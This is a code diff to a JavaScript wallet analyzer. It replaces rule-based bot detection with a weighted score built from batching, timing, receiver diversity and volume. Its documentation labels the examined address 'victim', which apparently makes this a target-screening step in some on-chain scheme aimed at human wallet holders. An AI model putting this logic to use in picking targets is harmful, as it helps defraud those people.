@@ -106,6 +106,7 @@ const LOOKBACK = ONCHAIN_LOOKBACK_BLOCKS[chainName] || 7200n;
 // ─── Stage 1 Constants ───
 const MIN_GAS_RESERVE_WEI = 2000000000000000n;
 const MAX_NONCE_LIMIT = 1000;
+const BOT_SCORE_THRESHOLD = 0.6;
 
 let isFetching = false;
 
@@ -170,24 +171,32 @@ function setAnalyzedCache(key, passes) {
 }
 
 /**
- * Stage 1 + Stage 2 combined analysis.
- *
- * Stage 1 (fast): bytecode, nonce, balance — rejects contracts/exchanges/drained wallets
- * Stage 2 (heavy): behavioral heuristics with batch + streak + volume detection
- *
- * Checks:
- *   S1:     Contract / nonce / balance
- *   S2-1:   In-block batch detection (3+ transfers in same block)
- *   S2-2:   Sustained batching (3+ blocks with batches)
- *   S2-3:   Zero-gap ratio (>40% of intervals are 0 seconds)
- *   S2-4:   Sleep-gap analysis (humans have > 4hr gaps)
- *   S2-5:   Time-delta variance (bots have CV < 0.15)
- *   S2-6:   dApp / receiver diversity (bots target 1-2 addresses)
- *   S2-7:   On-chain frequency (bots fire 15+ txs in hours)
- *   S2-8:   Consecutive-block streak 🆕 (4+ txs in adjacent blocks = script)
- *   S2-9:   Single-receiver sweeper 🆕 (all outgoing to 1 address, high volume)
- *   S2-10:  High-density burst 🆕 (60+ transfers in <= 4 days)
- *   S2-11:  Daily outgoing volume 🆕 (30+ transfers at 15+/day)
+ * Stage 1 + Stage 2 combined analysis using weighted scoring.
+ * 
+ * Score range: 0.0 (definitely human) to 1.0 (definitely bot)
+ * Threshold: >= 0.6 = bot
+ * 
+ * Signals:
+ *    +0.65  extreme_batch         (>= 3 transfers in a single block)
+ *    +0.35  batch                 (exactly 2 in a block)
+ *    +0.25  sustained_batch       (>= 3 different blocks each with a batch)
+ *    +0.65  extreme_block_streak  (4+ transfers across consecutive/adjacent blocks)
+ *    +0.40  block_streak          (3 transfers across consecutive/adjacent blocks)
+ *    +0.30  24/7                  (> 75% hours, compressed into < 30 days)
+ *    +0.35  robotic               (avg interval < 5min AND CV < 0.45)
+ *    +0.60  single_recv_sweeper   (1 receiver, >= 30 txs, NOT a long-span human)
+ *    +0.50  single_recv           (1 receiver, 10-29 txs, NOT a long-span human)
+ *    +0.10  single_recv_humanlike (1 receiver but history spans > 90 days)
+ *    +0.20  low_div               (2 receivers)
+ *    +0.25  rapid                 (avg interval < 60s)
+ *    +0.20  zero_gap              (> 40% of intervals are 0s)
+ *    +0.55  high_density          (>= 60 txs inside <= 4 days)
+ *    +0.35  dense                 (>= 30 txs inside <= 7 days)
+ *    +0.60  high_daily_vol        (>= 30 txs at >= 15 outgoing/day)
+ *    +0.40  daily_vol             (>= 20 txs at >= 8 outgoing/day)
+ *    +0.50  mostly_rapid          (> 50% of transactions are < 180s apart)
+ *    +0.40  rapid_bursts          (10+ rapid back-to-back outgoing transactions)
+ *    -0.40  human_diversity       (> 10 receivers AND > 30 days span)
  *
  * @param {string} victimAddress - lowercase address of the sender/victim
  * @returns {Promise<boolean>} - true if likely human, false if likely bot
@@ -247,30 +256,6 @@ async function passesBehavioralHeuristics(victimAddress) {
       onChainLogs = [];
     }
 
-    // ─── BATCH DETECTION ───
-    const blockCounts = new Map();
-    for (const log of onChainLogs) {
-      const bn = Number(log.blockNumber);
-      blockCounts.set(bn, (blockCounts.get(bn) || 0) + 1);
-    }
-
-    const blockCountsValues = [...blockCounts.values()];
-    const maxBatchSize = blockCountsValues.length > 0 ? Math.max(...blockCountsValues) : 0;
-    const batchBlockCount = blockCountsValues.filter(c => c >= 3).length;
-
-    const dbBlockCounts = new Map();
-    for (const row of dbRows) {
-      if (row.block_number) {
-        const bn = Number(row.block_number);
-        dbBlockCounts.set(bn, (dbBlockCounts.get(bn) || 0) + 1);
-      }
-    }
-    const dbMaxBatch = dbBlockCounts.size > 0 ? Math.max(...dbBlockCounts.values()) : 0;
-
-    const effectiveMaxBatch = Math.max(maxBatchSize, dbMaxBatch);
-    const hasInBlockBatch = effectiveMaxBatch >= 3;
-    const hasSustainedBatch = batchBlockCount >= 3;
-
     // ─── Combine all activity timestamps ───
     const allTimestamps = [];
 
@@ -298,16 +283,39 @@ async function passesBehavioralHeuristics(victimAddress) {
       allTimestamps.push(approxTime);
     }
 
-    // ─── ZERO-GAP COUNTING ───
     allTimestamps.sort((a, b) => a - b);
 
+    // ─── INSUFFICIENT DATA ───
+    if (allTimestamps.length < 5) {
+      setAnalyzedCache(cacheKey, true);
+      return true;
+    }
+
+    // ─── Calculate intervals and metrics ───
     const intervals = [];
     let zeroGapCount = 0;
     let totalIntervalCount = 0;
+    let minInterval = Infinity;
+    let rapidCount = 0; // < 180 seconds (3 minutes)
+    let rapidBurstCount = 0; // outgoing rapid bursts (< 30 seconds)
 
     for (let i = 1; i < allTimestamps.length; i++) {
       const gapMs = allTimestamps[i] - allTimestamps[i - 1];
+      const gapSeconds = gapMs / 1000;
       totalIntervalCount++;
+
+      if (gapSeconds > 0 && gapSeconds < minInterval) {
+        minInterval = gapSeconds;
+      }
+
+      if (gapSeconds < 180) {
+        rapidCount++;
+      }
+
+      if (gapSeconds < 30) {
+        rapidBurstCount++;
+      }
+
       if (gapMs > 30000) {
         intervals.push(gapMs);
       } else {
@@ -316,52 +324,31 @@ async function passesBehavioralHeuristics(victimAddress) {
     }
 
     const zeroGapRatio = totalIntervalCount > 0 ? zeroGapCount / totalIntervalCount : 0;
-    const hasHighZeroGapRatio = zeroGapRatio > 0.40;
+    const rapidRatio = totalIntervalCount > 0 ? rapidCount / totalIntervalCount : 0;
 
-    const dedupedTimes = [];
-    for (const ts of allTimestamps) {
-      if (dedupedTimes.length === 0 || (ts - dedupedTimes[dedupedTimes.length - 1]) > 30000) {
-        dedupedTimes.push(ts);
+    // ─── Batch Detection ───
+    const blockCounts = new Map();
+    for (const log of onChainLogs) {
+      const bn = Number(log.blockNumber);
+      blockCounts.set(bn, (blockCounts.get(bn) || 0) + 1);
+    }
+
+    const blockCountsValues = [...blockCounts.values()];
+    const maxBatchSize = blockCountsValues.length > 0 ? Math.max(...blockCountsValues) : 0;
+    const batchBlockCount = blockCountsValues.filter(c => c >= 3).length;
+
+    const dbBlockCounts = new Map();
+    for (const row of dbRows) {
+      if (row.block_number) {
+        const bn = Number(row.block_number);
+        dbBlockCounts.set(bn, (dbBlockCounts.get(bn) || 0) + 1);
       }
     }
+    const dbMaxBatch = dbBlockCounts.size > 0 ? Math.max(...dbBlockCounts.values()) : 0;
 
-    // ─── INSUFFICIENT DATA ───
-    if (dedupedTimes.length < 5 && onChainLogs.length < 5 && dbRows.length < 5) {
-      setAnalyzedCache(cacheKey, true);
-      return true;
-    }
+    const effectiveMaxBatch = Math.max(maxBatchSize, dbMaxBatch);
 
-    // ─── CHECK 1: Sleep-Gap Analysis ───
-    let hasSleepGap = true;
-    if (dedupedTimes.length >= 3) {
-      let maxGapMs = 0;
-      for (let i = 1; i < dedupedTimes.length; i++) {
-        const gap = dedupedTimes[i] - dedupedTimes[i - 1];
-        if (gap > maxGapMs) maxGapMs = gap;
-      }
-      hasSleepGap = maxGapMs > (4 * 60 * 60 * 1000);
-    }
-
-    // ─── CHECK 2: Time-Delta Variance (CV) ───
-    let isProgrammaticInterval = false;
-    if (intervals.length >= 5) {
-      const mean = intervals.reduce((a, b) => a + b, 0) / intervals.length;
-      const variance = intervals.reduce((acc, v) => acc + Math.pow(v - mean, 2), 0) / intervals.length;
-      const cv = mean === 0 ? 0 : Math.sqrt(variance) / mean;
-      isProgrammaticInterval = cv < 0.15;
-    }
-
-    // ─── CHECK 3: dApp / Receiver Diversity ───
-    const dbReceivers = new Set(dbRows.map(t => (t.receiver || '').toLowerCase()));
-    const onChainReceivers = new Set(onChainLogs.map(l => l.args.to.toLowerCase()));
-    const allUniqueReceivers = new Set([...dbReceivers, ...onChainReceivers]);
-    const hasDiversity = allUniqueReceivers.size >= 3;
-
-    // ─── CHECK 4: On-chain Frequency ───
-    const onChainTxCount = onChainBlockNumbers.length;
-    const isHighFrequency = onChainTxCount > 15;
-
-    // ─── CHECK 5 🆕: Consecutive-Block Streak ───
+    // ─── Consecutive-Block Streak ───
     let maxBlockStreak = 0;
     let currentStreak = 0;
     for (let i = 1; i < onChainBlockNumbers.length; i++) {
@@ -373,50 +360,151 @@ async function passesBehavioralHeuristics(victimAddress) {
         currentStreak = 0;
       }
     }
-    const hasBlockStreak = maxBlockStreak >= 3;
 
-    // ─── CHECK 6 🆕: Activity Volume & Daily Rate ───
-    const totalActivity = allTimestamps.length;
-    const spanMs = totalActivity >= 2
-      ? allTimestamps[totalActivity - 1] - allTimestamps[0]
+    // ─── Time-based metrics ───
+    const spanMs = allTimestamps.length >= 2
+      ? allTimestamps[allTimestamps.length - 1] - allTimestamps[0]
       : 0;
     const spanDays = spanMs / (1000 * 60 * 60 * 24);
+
+    const hours = new Set();
+    for (const ts of allTimestamps) {
+      hours.add(new Date(ts).getUTCHours());
+    }
+    const hourCoverage = hours.size / 24;
+
+    const avgInterval = intervals.length > 0
+      ? intervals.reduce((a, b) => a + b, 0) / intervals.length / 1000 // convert to seconds
+      : 0;
+
+    const variance = intervals.length > 0
+      ? intervals.reduce((acc, v) => acc + Math.pow(v / 1000 - avgInterval, 2), 0) / intervals.length
+      : 0;
+    const cv = avgInterval === 0 ? 0 : Math.sqrt(variance) / avgInterval;
+
+    // ─── Receiver Diversity ───
+    const dbReceivers = new Set(dbRows.map(t => (t.receiver || '').toLowerCase()));
+    const onChainReceivers = new Set(onChainLogs.map(l => l.args.to.toLowerCase()));
+    const allUniqueReceivers = new Set([...dbReceivers, ...onChainReceivers]);
+    const receiverCount = allUniqueReceivers.size;
+
+    const totalActivity = allTimestamps.length;
     const transfersPerDay = spanDays > 0.001 ? totalActivity / spanDays : 0;
 
-    // ─── CHECK 7 🆕: Single-Receiver Sweeper ───
-    const isSingleReceiverSweeper = (
-      allUniqueReceivers.size === 1 &&
-      totalActivity >= 20 &&
-      spanDays <= 90
-    );
+    // ─── WEIGHTED SCORING ───
+    let score = 0;
+    const signals = [];
 
-    // ─── CHECK 8 🆕: High-Density Burst ───
-    const isHighDensityBurst = totalActivity >= 60 && spanDays > 0 && spanDays <= 4;
-    const isDenseBurst = totalActivity >= 30 && spanDays > 0 && spanDays <= 7;
+    // 1. In-block batching
+    if (effectiveMaxBatch >= 3) {
+      score += 0.65;
+      signals.push(`extreme_batch(max=${effectiveMaxBatch})`);
+    } else if (effectiveMaxBatch === 2) {
+      score += 0.35;
+      signals.push(`batch(max=${effectiveMaxBatch})`);
+    }
 
-    // ─── CHECK 9 🆕: Daily Outgoing Volume ───
-    const isHighDailyVol = totalActivity >= 30 && transfersPerDay >= 15;
-    const isDailyVol = totalActivity >= 20 && transfersPerDay >= 8;
+    // 2. Sustained batching
+    if (batchBlockCount >= 3) {
+      score += 0.25;
+      signals.push(`sustained_batch(${batchBlockCount}blocks)`);
+    }
 
-    // ─── FINAL VERDICT ───
-    const isLikelyBot = (
-      (!hasSleepGap && isProgrammaticInterval) ||
-      (isHighFrequency && isProgrammaticInterval) ||
-      (isHighFrequency && !hasDiversity && !hasSleepGap) ||
-      (hasInBlockBatch && hasSustainedBatch) ||
-      (hasInBlockBatch && isHighFrequency) ||
-      (hasInBlockBatch && hasHighZeroGapRatio && !hasDiversity) ||
-      (hasSustainedBatch && !hasSleepGap) ||
-      hasBlockStreak ||
-      isSingleReceiverSweeper ||
-      isHighDensityBurst ||
-      isHighDailyVol ||
-      (isDailyVol && isDenseBurst) ||
-      (isDailyVol && !hasDiversity) ||
-      (isDailyVol && !hasSleepGap)
-    );
+    // 3. Consecutive-block execution streak
+    if (maxBlockStreak >= 3) {
+      score += 0.65;
+      signals.push(`extreme_block_streak(${maxBlockStreak})`);
+    } else if (maxBlockStreak >= 2) {
+      score += 0.40;
+      signals.push(`block_streak(${maxBlockStreak})`);
+    }
 
-    const isHuman = !isLikelyBot;
+    // 4. 24/7 activity
+    if (hourCoverage > 0.75 && spanDays < 30) {
+      score += 0.30;
+      signals.push(`24/7(${hours.size}h/${spanDays.toFixed(0)}d)`);
+    }
+
+    // 5. Robotic timing
+    if (avgInterval < 300 && cv < 0.45 && intervals.length >= 5) {
+      score += 0.35;
+      signals.push(`robotic(avg=${avgInterval.toFixed(0)}s,cv=${cv.toFixed(2)})`);
+    }
+
+    // 6. Single receiver = sweeper / forwarder
+    if (receiverCount === 1) {
+      const humanLike = spanDays > 90;
+      if (humanLike) {
+        score += 0.10;
+        signals.push(`single_recv_humanlike(${spanDays.toFixed(0)}d)`);
+      } else if (totalActivity >= 30) {
+        score += 0.60;
+        signals.push(`single_recv_sweeper(${totalActivity}tx)`);
+      } else {
+        score += 0.50;
+        signals.push(`single_recv(${totalActivity}tx)`);
+      }
+    } else if (receiverCount <= 2) {
+      score += 0.20;
+      signals.push(`low_div(${receiverCount})`);
+    }
+
+    // 7. Extreme frequency
+    if (avgInterval < 60 && avgInterval > 0) {
+      score += 0.25;
+      signals.push(`rapid(${avgInterval.toFixed(0)}s)`);
+    }
+
+    // 8. High zero-gap ratio
+    if (zeroGapRatio > 0.40) {
+      score += 0.20;
+      signals.push(`zero_gap(${(zeroGapRatio * 100).toFixed(0)}%)`);
+    }
+
+    // 9. High-density campaign burst
+    if (spanDays <= 4 && totalActivity >= 60) {
+      score += 0.55;
+      signals.push(`high_density(${totalActivity}tx/${spanDays.toFixed(1)}d)`);
+    } else if (spanDays <= 7 && totalActivity >= 30) {
+      score += 0.35;
+      signals.push(`dense(${totalActivity}tx/${spanDays.toFixed(1)}d)`);
+    }
+
+    // 10. Sustained daily outgoing volume
+    if (totalActivity >= 30 && transfersPerDay >= 15) {
+      score += 0.60;
+      signals.push(`high_daily_vol(${transfersPerDay.toFixed(0)}/day)`);
+    } else if (totalActivity >= 20 && transfersPerDay >= 8) {
+      score += 0.40;
+      signals.push(`daily_vol(${transfersPerDay.toFixed(0)}/day)`);
+    }
+
+    // 11. Ratio-based rapid detection (> 50% of transactions are < 3 min apart)
+    if (totalIntervalCount > 10 && rapidRatio > 0.50) {
+      score += 0.50;
+      signals.push(`mostly_rapid(${(rapidRatio * 100).toFixed(0)}%)`);
+    }
+
+    // 12. Rapid outgoing burst check (replaces flawed sweep count on outgoing-only data)
+    if (rapidBurstCount >= 10) {
+      score += 0.40;
+      signals.push(`rapid_bursts(${rapidBurstCount}x)`);
+    }
+
+    // 13. Human diversity rescue (negative score for diverse, long-lived wallets)
+    if (receiverCount > 10 && spanDays > 30) {
+      score -= 0.40;
+      signals.push(`human_diversity(${receiverCount} contracts)`);
+    }
+
+    // Cap score between 0 and 1
+    score = Math.max(0, Math.min(score, 1.0));
+
+    const isHuman = score < BOT_SCORE_THRESHOLD;
+
+    if (!isHuman) {
+      logger.debug(`[Analyzer] Bot detected ${cacheKey}: score=${score.toFixed(2)}, signals=[${signals.join(', ')}]`);
+    }
 
     setAnalyzedCache(cacheKey, isHuman);
     return isHuman;
